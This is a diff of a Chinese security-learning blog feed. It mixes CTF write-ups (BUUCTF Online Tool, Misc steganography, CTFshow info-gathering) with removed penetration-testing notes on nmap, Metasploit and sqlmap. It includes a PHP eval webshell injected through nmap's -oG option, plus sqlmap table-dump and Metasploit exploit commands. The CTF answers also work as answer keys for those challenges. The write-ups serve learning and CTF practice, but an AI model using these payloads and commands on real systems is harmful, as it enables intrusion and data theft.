-<p>静态网站用于发布，比如发布一些文章，他不需要用户进行注册；动态则像是论坛，或者淘宝之类，有着大量数据流通的网站，我们判断一个网站属于静态还是动态，就直接在网站后面看他是什么结尾的就好了</p>
-<p>那么结尾没有显示脚本语言子集怎么办呢</p>
-<p>我们可以在网址后面，加上一个指令：index<express></p>
-<p>比如index.html，如果没有报错，那么我们就可以证明这就是一个html网站</p>
-<p>基于这个方法我们甚至可以判断这个网站是windows系统还是linux系统，这里使用的是linux系统对大小写敏感的问题</p>
-<p>比如你对一个html网站跟上index.Html，这个时候如果没报错，就是windows系统，如果报错，就是linux系统，因为Html这个写法linux无法识别</p>
+<p>HTTP_X_FORWARDED_FOR获取到的IP地址</p>
+<p>REMOTE_ADDR代表着客户端的IP</p>
+<p>这两个都为比较常见的服务器获取ip</p>
 </blockquote>
 <blockquote>
-<p>那么还有一种情况，伪静态<br>
-对于有些网站，你删除网址最后的html，或者改成php，或者一些其他的“在网址上让其不从属于静态网站”的操作时，他不会报错，依然可以正常显示网页内容，这样的网站就是伪静态网站。<br>
-伪静态是相对真实静态来讲的，通常我们为了增强<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/104812">搜索引擎</a>的友好面，都将文章内容生成静态页面，但是有的朋友为了实时的显示一些信息。或者还想运用动态脚本解决一些问题。不能用静态的方式来展示网站内容。但是这就损失了对搜索引擎的友好面。怎么样在两者之间找个中间方法呢，这就产生了伪静态技术。就是展示出来的是以html一类的静态页面形式，但其实是用ASP一类的动态脚本来处理的</p>
+<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
 </blockquote>
+<p>这有个system来执行命令有传参。</p>
+<p>本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。</p>
+<p><strong>-oG</strong>可以实现将命令和结果写到文件</p>
+<p>payload可以通过写一个Shell到文件中</p>
+<p>由此构造payload：</p>
+<blockquote>
+<p>'<?php @eval($_POST["hack"]); ?> -oG hack.php '</p>
+</blockquote>
+<p>转化为：</p>
+<blockquote>
+<p>''[\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\'''</p>
+</blockquote>
+<p>输出为：</p>
+<blockquote>
+<p>&lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \</p>
+</blockquote>
+<p>菜刀连接即可</p>
+<p>参考链接：</p>
+<p>http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/</p>
+<p>https://note.redmango.top/Online%20Tool(BUUCTF%202018)/</p>
+<p>https://paper.seebug.org/164/</p>
+<p>https://blog.csdn.net/qq_26406447/article/details/100711933</p>
+<p>https://blog.csdn.net/weixin_44077544/article/details/102835099</p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[渗透基础学习笔记]]></title>
-        <id>https://Ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/</id>
-        <link href="https://Ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/">
+        <title type="html"><![CDATA[BUUCTFMisc基础]]></title>
+        <id>https://Ro1ing.github.io/post/buuctfmisc-ji-chu/</id>
+        <link href="https://Ro1ing.github.io/post/buuctfmisc-ji-chu/">
         </link>
-        <updated>2021-01-30T05:27:06.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="主机发现学习笔记一">主机发现学习笔记(一)</h1>
-<p>首先先要了解协议中的<u>栈分层</u><br>
-<strong>OSI</strong>     （Open System Interconnect），即开放式系统互联。</p>
+        <updated>2021-01-30T06:38:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="金三胖"><strong>金三胖</strong></h2>
+<p>gif 使用fireworks 或其他 图像浏览软件 逐帧查看</p>
+<h2 id="二维码"><strong>二维码</strong></h2>
+<p>qr码扫下 没有意义 在十六进制编辑器中发现有文件</p>
+<p>使用 binwalk分离 4number.txt 和一个压缩包</p>
+<p>压缩包 4位数字爆破 获得</p>
+<h2 id="n种方法解决"><strong>N种方法解决</strong></h2>
+<p>base64图片 是一个二维码 还原 data:image/jpg base64</p>
+<h2 id="大白"><strong>大白</strong></h2>
+<p>图片明显修改过 宽高度被篡改</p>
+<p>使用TweakPNG</p>
 <blockquote>
-<p>应用层：给应用提供服务。<br>
-表示层：确保从设备的应用层发出的数据可以被另一个设备应用层理解，把文件转换成bit流。<br>
-会话层：建立、管理、终止表示层实体和传输层间的通信会话。<br>
-传输层：流控、检错、纠错和端到端通信。<br>
-网络层：tcp/ip的实现、路由功能。<br>
-数据链路层：控制物理层的协议。<br>
-物理层：电器和机械方面。</p>
-<p><strong>TCP/IP</strong><br>
-应用层：是网络应用程序及其应用层协议存留的层次。该层包括了所有与网络相关的高层协议，如文件传输协议（FTP）、超文本传输协议（HTTP）、远程终端协议（Telent)、简单邮件传送协议（SMTP)、因特网中继聊天（IRC)等。<br>
-传输层：使源端主机和目标端主机上的对等实体可以进行会话。该层有两种服务质量不同的协议：传输控制协议（TCP）和用户数据报协议（UDP）。<br>
-互联网层：通过路径选择把分组发往目标网络或主机，进行网络拥塞控制以及差错控制，是整个TCP/IP协议栈的核心。<br>
-网络访问层：负责网络层和物理层之间的通信，将网络层接收到的数据分割成特定的可被物理层传输的帧，并让物理层进行实际的数据传送。</p>
+<p>Warning：</p>
+<p>Incorrect crc for IHDR chunk (is 6d7c7135, should be 8e14dfcf)</p>
 </blockquote>
-<h2 id="二层主机发现">二层主机发现</h2>
-<p>二层主机发现指：利用ISO中链路层中的协议进行主机发现。一般使用<strong>ARP</strong>协议。<br>
-优点：（局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址）<br>
-1、速度快<br>
-2、可靠性高<br>
-缺点：<br>
-无法扫描经过路由的主机</p>
-<h3 id="扫描工具">扫描工具</h3>
-<p><strong>arping</strong></p>
+<p>使用十六进制编辑器修改</p>
+<p>回到图片 发现</p>
+<h2 id="基础破解"><strong>基础破解</strong></h2>
 <blockquote>
-<p>Kali自带；<br>
-缺点：只能对单个主机多次扫描。<br>
-<strong>netdiscover</strong><br>
-Kali自带；<br>
-针对特定的子网进行多主机。</p>
+<p>你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对==我说了什么了不得的东<br>
+西。。</p>
 </blockquote>
-<h2 id="三层主机发现">三层主机发现</h2>
-<p>三层主机发现指：利用ISO中网络中的协议进行主机发现。一般使用<strong>ICMP</strong>协议。<br>
-优点：<br>
-1、可以发现远程主机 经过路由的主机<br>
-2、速度相对比较快<br>
-缺点：<br>
-1、经常被防火墙过滤<br>
-2、速度相比二层发现慢</p>
-<h3 id="扫描工具-2">扫描工具</h3>
-<p><strong>ping</strong></p>
-<blockquote>
-<p>ping IP地址<br>
-Linux和windows都有自带，<br>
-Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。<br>
-<strong>fping</strong><br>
-fping -g IP地址/端口号<br>
-Kali自带;<br>
-可以针对多个主机同时进行主机发现。<br>
-<strong>hping3</strong><br>
-hping3 -h //修改ICMP相关指令<br>
-hping3 -c 扫描次数 --icmp IP地址<br>
-Kali自带；<br>
-可以发送自定义 ICMP数据包 。</p>
-</blockquote>
-<h2 id="四层主机发现">四层主机发现</h2>
-<p>四层发现指利用OSI中的传输层协议进行主机发现，一般使用<strong>TCP、UDP</strong>探测。<br>
-优点：<br>
-1、可探测远程主机<br>
-2、比三层发现更为可靠<br>
-缺点：<br>
-花费时间更长</p>
-<h3 id="扫描工具-3">扫描工具</h3>
-<p><strong>nmap</strong></p>
-<blockquote>
-<p>nmap IP地址<br>
-Kali自带；<br>
-可以进行二、三、四层的探测 。<br>
-<strong>hping3</strong><br>
-hping3 --udp -c 3 -p端口号 IP地址<br>
-//--udp	使用udp进行探测	-c 使用3次	默认端口为零	浏览器默认端口为80<br>
-Kali自带；<br>
-可以进行对应的四层层主机发现。<br>
-Python脚本-<strong>nWatch</strong><br>
-安装：pip install python-nmap</p>
-</blockquote>
-<h1 id="漏洞扫描学习笔记一">漏洞扫描学习笔记(一)</h1>
-<h2 id="漏洞扫描原理"><strong>漏洞扫描原理</strong></h2>
-<p>漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应的具体漏洞。但是也存在错误扫描，需要对扫描结果进行漏洞验证。</p>
-<p>其实扫描器的原理大致相同都是通过发送对应的验证数据到目标具体服务进行验证。当收到目标返回的响应与存在漏洞的响应一致时，就表明存在漏洞。</p>
-<h3 id="漏洞扫描工具">漏洞扫描工具</h3>
-<p><strong>Nmap</strong></p>
-<blockquote>
-<p>nmap --script vuln 目标IP地址<br>
-<strong>Nessus</strong> 系统漏洞扫描<br>
-**Metasploit **对扫描到的漏洞加以利用<br>
-以vsftpd2.3.4为例<br>
-search vsftpd<br>
-得到<br>
-use (复制粘贴上面的路径)<br>
-show payloads<br>
-set payload <u>cmd/unix/interact</u> //上面展示的路径<br>
-show options 设置所用的参数<br>
-set rhost（上面name下面的） ip<br>
-show options 观察是否设置成功<br>
-exploit  溢出<br>
-得到shell</p>
-</blockquote>
-<h2 id="web应用程序漏洞扫描">web应用程序漏洞扫描</h2>
-<p>针对web应用程序的漏洞扫描其实就是每个扫描器读取自己的payload进行探测</p>
-<blockquote>
-<p>常见Web漏洞扫描器：<br>
-1.Owasp-zap<br>
-2.awvs<br>
-3.appscan<br>
-4.nikto<br>
-5.Burpsuite<br>
-每个扫描器都有各自不同的payload探测<br>
-<strong>Woasp-zap</strong><br>
-kali自带<br>
-直接输入url攻击即可<br>
-<strong>Nikto</strong><br>
-nikto -host IP地址<br>
-对目标服务器进行漏洞扫描 主要针对HTTP服务器</p>
-</blockquote>
-<h3 id="漏洞利用">漏洞利用</h3>
-<p><strong>Sqlmap</strong> 对扫描到的sql注入漏洞进行利用</p>
-<blockquote>
-<p>在owasp-zap 扫到的sql漏洞复制出<br>
-在浏览器里粘贴<br>
-修改不为sql报错信息<br>
-然后在终端内<br>
-sqlmap -u &quot;url&quot;<br>
-sqlmap -u &quot;url&quot; -T admin --columns<br>
-sqlmap -u &quot;url&quot; -T admin -C &quot;admin,passwprd&quot; --dump获取对应数据<br>
-然后密文解密<br>
-得到shell</p>
-</blockquote>
-<h1 id="端口扫描学习笔记一">端口扫描学习笔记(一)</h1>
-<h2 id="端口的基本介绍">端口的基本介绍</h2>
-<p>&quot;<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>&quot;是英文port的意译，可以认为是<a href="https://baike.baidu.com/item/%E8%AE%BE%E5%A4%87/3794003">设备</a>与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中<a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F/10866735">虚拟</a>端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11插口也属于物理端口的范畴。</p>
-<p>一台拥有IP地址的主机可以提供许多服务，比如：</p>
-<p><a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1">Web服务</a>、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1">网络服务</a>呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。因此 ，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对此服务进行测试，首先要确定是否开放对应端口号。</p>
-<h2 id="端口扫描工具">端口扫描工具</h2>
-<p><strong>Nmap</strong></p>
-<blockquote>
-<p>nmap IP地址</p>
-</blockquote>
-<p><strong>Dmitry</strong></p>
-<blockquote>
-<p>其中-p参数指定dmitry进行tcp端口扫描。</p>
-<p>dmitry -p IP地址</p>
-<p>相对 nmap 扫描端口较少，因为只会扫描常用端口</p>
-</blockquote>
-<p><strong>netcat</strong></p>
-<blockquote>
-<p>-nc -nvz ip地址 端口范围</p>
-<p>例 ： -nc -nvz 192.168.xxx.xxx 20-30</p>
-<p>端口的分类：</p>
-<p>端口号的范围是从1～65535 //2的16次方</p>
-</blockquote>
-<h2 id="端口分类">端口分类</h2>
-<p>端口范围 <strong>0-65535</strong></p>
-<p><strong>TCP端口</strong>和<strong>UDP端口</strong>。<u>由于TCP和UDP 两个协议是独立的，因此各自的端口号也相互独立</u>，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。</p>
-<p>端口分为：</p>
-<p>1、<u>周知端口</u></p>
-<p>周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在IE的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。它们紧密绑定于一些服务，通常这些端口的通讯明确表明了某种服务的协议，如：80端口对应与HTTP通信，21端口绑定与FTP服务，25端口绑定于SMTP服务，135端口绑定与RPC（远程过程调用）服务。</p>
-<p>2、<u>动态端口</u></p>
-<p>动态端口的范围是从49152到65535。之所以称为动态端口，是因为它 一般不固定分配某种服务，而是动态分配。理论上，不应为服务分配这些端口，通常机器从1024开始分配动态端口。例外：SUN的RPC端口从32768开始。</p>
-<p>可能会被木马攻击，等待端口的分配</p>
-<p>3、<u>注册端口</u></p>
-<p>端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。它们松散的绑定于一些服务，也就是说有许多服务绑定于这些端口，这些端口同样用于其他许多目的，如：许多系统处理端口从1024开始</p>
-<h3 id="获取端口banner信息工具">获取端口Banner信息工具</h3>
-<p><strong>Nmap</strong>扫描指定主机的端口信息，并<u>返回Banner</u></p>
-<blockquote>
-<p>nmap IP地址 -p 端口号 --script banner</p>
-</blockquote>
-<p><strong>Dmitry</strong> 获取端口信息</p>
-<blockquote>
-<p>dmitry -pb IP地址</p>
-</blockquote>
-<p><strong>Netcat</strong> 获取banner信息</p>
-<blockquote>
-<p>nc -vn IP地址 端口号</p>
-</blockquote>
-<p><strong>Nmap</strong><u>获取目标系统的端口版本信息</u></p>
-<blockquote>
-<p>nmap -p 端口号 -sV IP地址</p>
-</blockquote>
-<p><strong>Nmap</strong>扫描指定<u>主机的操作系统版本</u></p>
-<blockquote>
-<p>nmap -O IP地址</p>
-</blockquote>
-<h1 id="http协议学习笔记一">Http协议学习笔记(一)</h1>
-<h4 id="什么是http">什么是HTTP？</h4>
-<p>​    互联网应用最广泛的一种网络协议，所有<u>www文件</u>必须遵守这个标准，设计最初目的是为了提供一种发布和接受<u>HTML</u>页面的方法。</p>
-<blockquote>
-<p>超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。</p>
-</blockquote>
-<p>HTTP由两部分组成：<strong>请求</strong>和<strong>响应</strong>。当你在Web浏览器中输入一个URL时，浏览器将根据你的要求创建并发送请求，该请求包含所输入的URL以及一些与浏览器本身相关的信息。当服务器收到这个请求时将返回一个响应，该响应包括与该请求相关的信息以及位于指定URL（如果有的话）的数据。直到浏览器解析该响应并显示出网页（或其他资源）为止。</p>
-<p>常见的请求头：</p>
-<blockquote>
-<p>Accept：浏览器可接受的MIME类型。<br>
-Accept - Charset：浏览器可接受的字符集。<br>
-Accept - Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。<br>
-Accept - Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。<br>
-Authorization：授权信息，通常出现在对服务器发送的WWW - Authenticate头的应答中。<br>
-Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep - Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content - Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。<br>
-Content - Length：表示请求消息正文的长度。<br>
-Cookie：这是最重要的请求头信息之一，参见后面《Cookie处理》一章中的讨论。<br>
-From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。<br>
-Host：初始URL中的主机和端口。<br>
-If - Modified - Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。<br>
-Pragma：指定“no - cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。<br>
-Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。<br>
-User - Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。<br>
-UA - Pixels，UA - Color，UA - OS，UA - CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</p>
-</blockquote>
-<h4 id="什么是https">什么是HTTPS？</h4>
-<blockquote>
-<p>《图解HTTP》这本书中曾提过HTTPS是身披SSL外壳的HTTP。HTTPS是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。</p>
-<p>PS:TLS是传输层加密协议，前身是SSL协议，由网景公司1995年发布，有时候两者不区分。</p>
-</blockquote>
-<p>常见考点：</p>
+<p>四位数字 直接爆破 得到base64解密</p>
+<h2 id="你竟然赶我走"><strong>你竟然赶我走</strong></h2>
+<p>十六进制的最后发现了</p>
+<h2 id="lsb"><strong>LSB</strong></h2>
+<p>stegsolve解析</p>
+<p><img src="LSB.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988768771.png" alt="" loading="lazy"><br>
+上面感觉有东西</p>
+<p>使用 zsteg 解密一下 无</p>
+<p>stegsolve 发现红黄蓝有字</p>
+<p><img src="LSB2.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988772613.png" alt="" loading="lazy"><br>
+生成图片 扫描获得</p>
+<h2 id="乌镇峰会种图"><strong>乌镇峰会种图</strong></h2>
+<p>十六进制的最后</p>
+<h2 id="ningen"><strong>ningen</strong></h2>
+<p>binwalk分离</p>
+<p>压缩包爆破四位数字 工具ziperello</p>
+<p>获得</p>
+<h2 id="rar"><strong>rar</strong></h2>
+<p>爆破4位</p>
+<h2 id="qr"><strong>qr</strong></h2>
+<p>扫码</p>
+<h2 id="文件中的秘密"><strong>文件中的秘密</strong></h2>
+<p>十六进制的中间 发现</p>
+<h2 id="镜子里面的世界"><strong>镜子里面的世界</strong></h2>
+<p>用stegsloves 分析</p>
+<p><img src="%E9%95%9C%E5%AD%90%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%96%E7%95%8C.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988780681.png" alt="" loading="lazy"></p>
+<h2 id="小明的保险箱"><strong>小明的保险箱</strong></h2>
+<p>binwalk分离 四位密码爆破</p>
+<h2 id="爱因斯坦"><strong>爱因斯坦</strong></h2>
+<p>binwalk 图片备注中有 压缩包密码</p>
+<h2 id="假如给我三天光明"><strong>假如给我三天光明</strong></h2>
+<p>解盲文  😦   kmdonowg</p>
+<p>听摩斯电码 网上有摩斯电码的音频解析网站 当时是一点一点看的:(</p>
+<h2 id="wireshark"><strong>wireshark</strong></h2>
+<p>使用wireshark 找到那条http login流量中的数据包</p>
+<h2 id="easycap"><strong>easycap</strong></h2>
+<p>追踪 TCP流</p>
+<h2 id="被嗅探的流量"><strong>被嗅探的流量</strong></h2>
+<p>追踪 TCP流 流量包中发现</p>
+<h2 id="flag"><strong>FLAG</strong></h2>
+<p>stegsloves</p>
+<p><img src="FLAG.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988789645.png" alt="" loading="lazy"><br>
+文件头是 zip</p>
+<p>里面一个二进制文件</p>
+<p>使用kali strings</p>
+<p><img src="FLAG2.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988793153.png" alt="" loading="lazy"></p>
+<h2 id="另一个世界"><strong>另一个世界</strong></h2>
+<p>十六进制最后一串二进制 转ascii码 得到 koekj3s</p>
+<h2 id="荷兰宽带数据泄露"><strong>荷兰宽带数据泄露</strong></h2>
+<p>下载附件得到一个conf.bin文件，路由器信息数据，一般包含账号密码。题目并没有提示flag是什么，猜测是账号或者密码加上格式为最终flag。</p>
+<p>用RouterPassView查看后，搜索username或者password，最后发现是用户名</p>
+<h2 id="来首歌吧"><strong>来首歌吧</strong></h2>
+<p>右耳道摩斯密码</p>
+<h2 id="隐藏的钥匙"><strong>隐藏的钥匙</strong></h2>
+<p>十六进制内</p>
+<h2 id="后门查杀"><strong>后门查杀</strong></h2>
+<p>include下发现include.php为webshell文件</p>
+<p><img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%80.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988801371.png" alt="" loading="lazy"><br>
+<img src="%E5%90%8E%E9%97%A8%E6%9F%A5%E6%9D%802.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988804693.png" alt="" loading="lazy"></p>
+<h2 id="梅花香自苦寒来"><strong>梅花香自苦寒来</strong></h2>
+<h2 id="snake"><strong>snake</strong></h2>
+<p>binwalk 分离 将key中字符串解密</p>
+<p><img src="snake.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988808332.png" alt="" loading="lazy"><br>
+Serpent 有蛇的意思在西方神话是一条巨大的蛇型恶魔</p>
+<p>anaconda</p>
+<h2 id="神秘龙卷风"><strong>神秘龙卷风</strong></h2>
+<p>压缩包 四位数字爆破 Brainfuck和Ook加解密</p>
+<p>https://tool.bugku.com/brainfuck/</p>
+<h2 id="面具下的-flag"><strong>面具下的 flag</strong></h2>
+<p>Brainfuck和Ook加解密</p>
+<h2 id="webshell后门"><strong>webshell后门</strong></h2>
+<p><img src="webshell%E5%90%8E%E9%97%A8.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988814827.png" alt="" loading="lazy"></p>
+<h2 id="被劫持的神秘礼物"><strong>被劫持的神秘礼物</strong></h2>
+<p>小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p>
+<p>wireshark http数据</p>
+<p><img src="%E8%A2%AB%E5%8A%AB%E6%8C%81%E7%9A%84%E7%A5%9E%E7%A7%98%E7%A4%BC%E7%89%A9.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988818695.png" alt="" loading="lazy"><br>
+拼接用户名密码得到adminaadminb</p>
+<p>使用md5加密后得到1d240aafe21a86afc11f38a45b541a49</p>
+<h2 id="刷新过的图片"><strong>刷新过的图片</strong></h2>
+<p>F5隐写</p>
+<p><img src="%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988824852.png" alt="" loading="lazy"><br>
+kali中 java Extract Misc.jpg</p>
+<p>解密出一个伪加密的压缩包</p>
+<h2 id="穿越时空的思念"><strong>穿越时空的思念</strong></h2>
+<p>摩斯电码</p>
+<h2 id="秘密文件"><strong>秘密文件</strong></h2>
+<p>binwalk分离文件 爆破密码</p>
+<h2 id="我吃三明治"><strong>我吃三明治</strong></h2>
+<p>一张图片</p>
+<p>使用foremost 解出两张图片</p>
+<p>看wp说是 在两张图片连接处 有类似与base32的字符串</p>
+<p><img src="%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB.png" alt="" loading="lazy"><br>
+<img src="https://Ro1ing.github.io/post-images/1611988838291.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CTFshow Web入门 信息收集篇]]></title>
+        <id>https://Ro1ing.github.io/post/ctfshow-web-ru-men-xin-xi-shou-ji-pian/</id>
+        <link href="https://Ro1ing.github.io/post/ctfshow-web-ru-men-xin-xi-shou-ji-pian/">
+        </link>
+        <updated>2021-01-30T06:37:57.000Z</updated>
+        <content type="html"><![CDATA[<p>其实还都是看大周师傅的wp才会做的 😃</p>
+<p>https://www.d1a0.cn/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</p>
+<h2 id="web1"><strong>web1</strong></h2>
+<p>题目：开发注释未及时删除</p>
+<p>解：右键查看源代码</p>
+<h2 id="web2"><strong>web2</strong></h2>
+<p>题目：js前台拦截</p>
+<p>解：禁止Javascript 右键查看源代码 或者 ctrl+u 快捷键</p>
+<h2 id="web3"><strong>web3</strong></h2>
+<p>题目： 没思路的时候抓个包看看，可能会有意外收获</p>
+<p>解题思路： burp抓包，查看响应头，得到flag。</p>
+<h2 id="web4"><strong>web4</strong></h2>
+<p>访问robots.txt</p>
+<p>得到提示</p>
+<p>/flagishere.txt</p>
+<h2 id="web5"><strong>web5</strong></h2>
+<p>题目： phps源码泄露有时候能帮上忙</p>
+<p>解题思路： 根据提示，访问index.phps将文件下载下来，打开即可看到flag。</p>
+<h2 id="web6"><strong>web6</strong></h2>
+<p>题目： 解压源码到当前目录，测试正常，收工</p>
+<p>解题思路： 访问www.zip ，下载源代码，查看index.php内容，发现flag在fl000g.txt中，这里注意压缩包里fl000g.txt中的flag不正确，应该访问题目环境中的fl000g.txt</p>
+<h2 id="web7"><strong>web7</strong></h2>
+<p>题目： 版本控制很重要，但不要部署到生产环境更重要。</p>
+<p>解题思路： 根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag。</p>
+<h2 id="web8"><strong>web8</strong></h2>
+<p>题目： 版本控制很重要，但不要部署到生产环境更重要。</p>
+<p>解题思路： 上一题访问.git得到flag，这一题首先想到.svn，果然得到flag。</p>
+<h2 id="web9"><strong>web9</strong></h2>
+<p>题目： 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p>
+<p>解题思路： 提示vim异常关闭，想到linux下vi/vim异常关闭是会存留.swp文件，尝试访问index.php.swp，得到flag。</p>
+<h2 id="web10"><strong>web10</strong></h2>
+<p>题目： cookie 只是一块饼干，不能存放任何隐私数据</p>
+<p>解题思路： 查看网页的cookie发现flag。</p>
+<h2 id="web11"><strong>web11</strong></h2>
+<p>题目： 域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p>
+<p>解题思路： 在域名解析查询网站查询，http://dbcha.com/ ，逐个尝试，在Txt中发现flag。</p>
+<figure data-type="image" tabindex="1"><img src="%5C1.png" alt="" loading="lazy"></figure>
+<h2 id="web12"><strong>web12</strong></h2>
+<p>题目： 有时候网站上的公开信息，就是管理员常用密码</p>
+<p>解题思路： 访问后台，/admin ，提示登录，猜想用户名为admin，密码应该在网站中，观察到页面底部有“Help Line Number : 372619038”，尝试输入数字，成功登录，得到flag。</p>
+<h2 id="web13"><strong>web13</strong></h2>
+<p>题目： 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
+<p>解题思路： 在网站中寻找技术文档（查看源代码寻找较为方便）,在底部找到document，点击即可查看到默认用户名，密码，访问http://.chall.ctf.show/system1103/login.php 。输入用户名和密码，即可得到flag。</p>
+<h2 id="web14"><strong>web14</strong></h2>
+<p>题目： 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死</p>
+<p>解题思路： 根据提示访问editor，出现文本编辑器，点击图片，</p>
+<p>可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问 http://6ce4a2ea-ac6a-4c12-84fa-40a347055991.chall.ctf.show/nothinghere/fl000g.txt 得到flag。</p>
+<h2 id="web15"><strong>web15</strong></h2>
+<p>题目： 公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
+<p>解题思路： 在网站底部发现一个qq邮箱，访问后台，发现可以有忘记密码选项，点击，密保问题是所在地城市，查找qq所在地为西安，输入，返回修改后的密码，登录即可得到flag。</p>
+<h2 id="web16"><strong>web16</strong></h2>
+<p>题目： 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
+<p>解题思路： 提到探针，就想到雅黑探针，访问/tz.php，点击PHP参数，</p>
+<p>点击下图红框中文字</p>
+<figure data-type="image" tabindex="2"><img src="2.png" alt="" loading="lazy"></figure>
+<p>跳转到网站的phpinfo页面，在页面搜索flag，即可找到flag。</p>
+<p>（关于php探针的内容可参考https://blog.csdn.net/weixin_43790779/article/details/108834213</p>
+<p>）</p>
+<h2 id="web17"><strong>web17</strong></h2>
+<p>题目： 透过重重缓存，查找到ctfer.com的真实IP，提交flag{IP地址}</p>
+<p>解题思路： <a href="https://icplishi.com/">https://icplishi.com</a> 查询www.ctfer.com 的IP地址，得到IP地址即为flag。</p>
+<h2 id="web18"><strong>web18</strong></h2>
+<p>题目： 不要着急，休息，休息一会儿，玩101分给你flag</p>
+<p>解题思路： 查看网页源代码，发现Flappy_js.js文件，访问可看到</p>
+<p>将\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</p>
+<p>进行Unicode解码得到 “你赢了，去幺幺零点皮爱吃皮看看”。访问110.php得到flag。</p>
+<h2 id="web19"><strong>web19</strong></h2>
+<p>题目： 密钥什么的，就不要放在前端了</p>
